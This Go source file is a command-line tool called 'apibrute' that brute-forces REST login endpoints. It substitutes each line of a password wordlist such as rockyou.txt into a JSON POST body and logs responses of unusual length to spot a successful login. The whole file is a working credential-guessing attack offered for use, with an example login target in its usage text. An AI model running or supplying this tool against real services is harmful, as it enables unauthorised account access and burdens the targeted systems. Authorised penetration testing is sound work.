//apibrute, brute force Post requests to REST endpoints
//Pretty damn slow, 17 seconds for 100 tries = 27 days for rockyou.txt
//Very rough but good enough for what I needed

package main

import (
	"bufio"
	"bytes"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
)




func attempt(ignoreInts []int, URI string, postData string, pass string) {
	
	//Prepare the data string, we need to insert our payload
	modPostData := strings.Replace(postData, "<=>", pass, -1)
	dataBuf := bytes.NewBufferString(modPostData)

	//Make the request
	resp, err := http.Post(URI, "application/json", dataBuf)
	if err != nil { panic(err) }

	//Read the body of the response
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil { panic(err) }

	//Ignore certain lengths as defined by user
	for _, length := range ignoreInts {
		if len(body) == length { return }
	}
	
	//Print Body
	log.Println(len(body), ":", string(body), ":", "Request:", modPostData)
}




func main() {
	
	//Help text if wrong arg count
	if len(os.Args) != 5 {
		println("")
		println("Err, should be 4 args, but saw", len(os.Args) - 1)
		println("Usage: apibrute <IgnoreLengths> <URI> <DataString> <PassFile>")
		println("eg: apibrute 17,52 http://localhost:3000/api/user/login \"{\\\"email\\\":\\\"user@mail.com\\\",\\\"password\\\":\\\"<=>\\\"}\"  wordlists/passwords/rockyou.txt")
		println("")
		println("<IgnoreLengths>, apibrute will ignore results with this length, split multiple values with ','")
		println("<URI>, endpoint to bruteforce")
		println("<DataString>, Sent as data in the post request, \"<=>\" gets substituted by the wordlist")
		println("<Passfile>, list of passwords (or other data) to substitute into the DataString")
		println("")
		return
	}

	//Process all args
	URI := os.Args[2] //Target endpoint
	dat := os.Args[3] //Data for post request
	passFile := os.Args[4] //File containing passwords
	sIgnoreInts := strings.Split(os.Args[1], ",") //lengths to ignore, need to process as there could be multiple, split on ','
	ignoreInts := []int{}
	for _, anInt := range sIgnoreInts { //convert lengths from string to ints
		i, err := strconv.Atoi(anInt)
		if err != nil { panic(err) }
		ignoreInts = append(ignoreInts, i)
	}
	
	//Open password file and iterate over it
	file, err := os.Open(passFile)
	if err != nil { panic(err) }
	defer file.Close()

	scanner := bufio.NewScanner(file)

	count := 0
	for scanner.Scan() {
		attempt(ignoreInts, URI, dat, scanner.Text()) //This is where the brute force happens
		count = count + 1
		if count % 100 == 0 { log.Println("Attmepts:", count) }
	}
	
	//Print number of attempts at end of run
	println("Attempts:", count)
}